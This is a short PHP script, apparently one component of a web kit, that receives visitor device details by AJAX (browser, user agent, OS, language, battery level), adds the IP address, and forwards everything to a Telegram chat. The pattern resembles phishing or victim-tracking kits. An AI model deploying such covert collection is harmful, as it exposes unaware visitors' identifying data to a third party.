<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

// Datos recibidos por AJAX
$agent = $_POST['agent'] ?? 'Unknown';
$navegador = $_POST['navegador'] ?? 'Unknown';
$versionapp = $_POST['versionapp'] ?? 'Unknown';
$dystro = $_POST['dystro'] ?? 'Unknown';
$idioma = $_POST['idioma'] ?? 'Unknown';
$bateri = $_POST['bateri'] ?? 'Unknown';

// IP del visitante
$ip = get_client_ip();
$ts = gmdate('c');

// Mensaje a Telegram
$msg = "📱 <b>Info del dispositivo</b>\n".
       "📌 IP: $ip\n".
       "🖥️ Navegador: $navegador\n".
       "🧩 User-Agent: $agent\n".
       "💻 Versión App: $versionapp\n".
       "🖲️ Sistema: $dystro\n".
       "🌐 Idioma: $idioma\n".
       "🔋 Batería: $bateri%\n".
       "⏰ Hora: $ts";

send_to_telegram($msg);

// Respuesta JSON
echo json_encode(['status' => 'ok']);
